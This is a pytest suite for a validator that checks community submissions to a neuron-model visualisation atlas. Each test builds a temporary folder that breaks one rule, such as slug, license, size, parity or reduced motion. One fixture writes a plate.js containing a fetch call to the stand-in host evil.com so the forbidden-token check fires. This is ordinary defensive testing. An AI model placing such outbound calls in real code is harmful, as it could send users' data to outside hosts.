"""Tests for Atlas community submission validator."""

from __future__ import annotations

import json
import sys
from pathlib import Path

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
import check_atlas_submissions as validator


def test_template_submission_passes() -> None:
    repo_root = Path(__file__).resolve().parents[2]
    template_dir = repo_root / "atlas" / "community" / "_template"
    issues = validator.check_submission(template_dir, write_parity=False)
    assert issues == [], f"Template failed validation with issues: {issues}"


def test_slug_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "Bad_Slug"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-slug",
                "title": "Bad Slug",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "illustrative",
                "covers": ["neurosush.neurons.models.LIF"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("slug:" in issue for issue in issues), f"Expected slug error, got: {issues}"


def test_allowed_files_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-files"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-files",
                "title": "Bad Files",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "illustrative",
                "covers": ["neurosush.neurons.models.LIF"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "malware.py").write_text("print('bad')")
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("allowed-files:" in issue for issue in issues), (
        f"Expected allowed-files error, got: {issues}"
    )


def test_size_limit_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-size"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-size",
                "title": "Bad Size",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "teaching-js",
                "covers": ["neurosush.neurons.models.LIF"],
                "equations": [
                    {
                        "js": "core.foo",
                        "python_ref": "neurosush.neurons.dynamics.lif_derivative",
                        "cases": [{"args": [-70, 5], "kwargs": {"v_rest": -70, "resistance": 10}}],
                        "abs": 1e-9,
                        "rel": 1e-9,
                    }
                ],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    # Make plate.js exceed 150KB
    (sub / "plate.js").write_text(
        "/* "
        + "A" * (151 * 1024)
        + " */\nfunction lif_derivative(){}\nfunction matchMedia(){return {matches:true};}"
    )
    (sub / "plate.test.mjs").write_text("import test from 'node:test';")
    (sub / "parity.json").write_text(json.dumps([{"js": "core.foo", "results": [50.0]}]))
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("size-limit:" in issue for issue in issues), (
        f"Expected size-limit error, got: {issues}"
    )


def test_covers_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-covers"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-covers",
                "title": "Bad Covers",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "illustrative",
                "covers": ["neurosush.neurons.models.NonExistentNeuron"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("covers:" in issue for issue in issues), f"Expected covers error, got: {issues}"


def test_license_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-license"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-license",
                "title": "Bad License",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "Apache-2.0",
                "data": "illustrative",
                "covers": ["neurosush.neurons.models.LIF"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("schema:" in issue or "license" in issue for issue in issues), (
        f"Expected license error, got: {issues}"
    )


def test_forbidden_tokens_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-token"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-token",
                "title": "Bad Token",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "teaching-js",
                "covers": ["neurosush.neurons.models.LIF"],
                "equations": [
                    {
                        "js": "core.foo",
                        "python_ref": "neurosush.neurons.dynamics.lif_derivative",
                        "cases": [{"args": [-70, 5], "kwargs": {"v_rest": -70, "resistance": 10}}],
                        "abs": 1e-9,
                        "rel": 1e-9,
                    }
                ],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "plate.js").write_text(
        "fetch('http://evil.com');\nfunction matchMedia(){return {matches:true};}"
    )
    (sub / "plate.test.mjs").write_text("import test from 'node:test';")
    (sub / "parity.json").write_text(json.dumps([{"js": "core.foo", "results": [50.0]}]))
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("forbidden-tokens:" in issue for issue in issues), (
        f"Expected forbidden-tokens error, got: {issues}"
    )


def test_reduced_motion_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-motion"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-motion",
                "title": "Bad Motion",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "teaching-js",
                "covers": ["neurosush.neurons.models.LIF"],
                "equations": [
                    {
                        "js": "core.foo",
                        "python_ref": "neurosush.neurons.dynamics.lif_derivative",
                        "cases": [{"args": [-70, 5], "kwargs": {"v_rest": -70, "resistance": 10}}],
                        "abs": 1e-9,
                        "rel": 1e-9,
                    }
                ],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "plate.js").write_text("console.log('no motion check');")
    (sub / "plate.test.mjs").write_text("import test from 'node:test';")
    (sub / "parity.json").write_text(json.dumps([{"js": "core.foo", "results": [50.0]}]))
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("reduced-motion:" in issue for issue in issues), (
        f"Expected reduced-motion error, got: {issues}"
    )


def test_parity_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-parity"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-parity",
                "title": "Bad Parity",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "teaching-js",
                "covers": ["neurosush.neurons.models.LIF"],
                "equations": [
                    {
                        "js": "core.foo",
                        "python_ref": "neurosush.neurons.dynamics.lif_derivative",
                        "cases": [{"args": [-70, 5], "kwargs": {"v_rest": -70, "resistance": 10}}],
                        "abs": 1e-9,
                        "rel": 1e-9,
                    }
                ],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "plate.js").write_text("const matchMedia = () => ({matches:true});")
    (sub / "plate.test.mjs").write_text("import test from 'node:test';")
    # Incorrect parity expected value
    (sub / "parity.json").write_text(json.dumps([{"js": "core.foo", "results": [999.0]}]))
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("parity:" in issue for issue in issues), f"Expected parity error, got: {issues}"


def test_idea_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "idea-extra"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "idea",
                "id": "c-idea-extra",
                "title": "Idea Extra",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "illustrative",
                "covers": ["neurosush.neurons.models.LIF"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    (sub / "plate.js").write_text("not allowed in idea")

    issues = validator.check_submission(sub)
    assert any("allowed-files:" in issue for issue in issues), (
        f"Expected allowed-files error for idea, got: {issues}"
    )


def test_recorded_run_rule_failure(tmp_path: Path) -> None:
    sub = tmp_path / "bad-run"
    sub.mkdir()
    (sub / "plate.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "kind": "plate",
                "id": "c-bad-run",
                "title": "Bad Run",
                "summary": "Summary",
                "authors": [{"name": "A", "github": "g"}],
                "license": "MIT",
                "data": "recorded-run",
                "renderer": {"core_plate": "P01"},
                "covers": ["neurosush.neurons.models.LIF"],
            }
        )
    )
    (sub / "README.md").write_text("# Test")
    # trace.json missing 'dt' in meta
    (sub / "trace.json").write_text(json.dumps({"meta": {"library": "neurosush", "seed": 7}}))
    (sub / "preview.png").write_bytes(b"png")

    issues = validator.check_submission(sub)
    assert any("recorded-run:" in issue for issue in issues), (
        f"Expected recorded-run error, got: {issues}"
    )
